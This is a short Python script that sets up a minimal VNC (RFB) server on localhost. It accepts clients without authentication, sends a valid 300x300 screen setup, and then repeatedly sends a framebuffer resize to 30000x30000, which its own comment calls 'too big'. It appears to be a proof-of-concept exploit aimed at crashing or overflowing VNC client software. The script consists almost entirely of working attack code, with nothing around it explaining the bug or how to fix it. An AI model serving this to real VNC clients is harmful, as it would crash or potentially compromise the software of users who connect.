from asyncio import run, sleep, start_server, StreamReader, StreamWriter
import struct

def resizeFramebuffer(w: int, h: int) -> bytes:
    msg = bytes()
    message_type = int(4)
    padding = int(0)
    msg += struct.pack(">BBhh", message_type, padding, w, h)
    return msg

async def callback(reader: StreamReader, writer: StreamWriter):
    width = 300 # initialize with a valid framebuffer size
    height = 300
    bpp = 32
    writer.write(b"RFB 003.008\n") # protocol handshake
    await reader.readline() # response
    writer.write(int(1).to_bytes(1, "big") + int(1).to_bytes(1, "big")) # 1 security type: NONE
    await reader.readexactly(1) # selected type
    writer.write(int(0).to_bytes(4, "big")) # security result
    await reader.readexactly(1) # client init, shared flag
    # server init
    writer.write(
            struct.pack(">HHBBBBHHHBBBBBBI",
                        width, height, # Framebuffer width and height
                        bpp, # Bits per pixel
                        32, # Color depth
                        0, # Big endian
                        1, # True Color
                        255, 255, 255, # Color max values
                        16, 8, 0, # Color shifts
                        0, 0, 0, # Padding
                        7, # Name length
            ) + ("desktop".encode("latin-1")) # Name
        )

    while True:
        writer.write(resizeFramebuffer(30000,30000)) # then change to one that is too big
        print("tick")
        await sleep(5)

async def main():
    host = "127.0.0.1"
    port = 5900
    server = await start_server(callback, host, port)
    print(f"serving on {host}:{port}")
    async with server:
        await server.serve_forever()

run(main())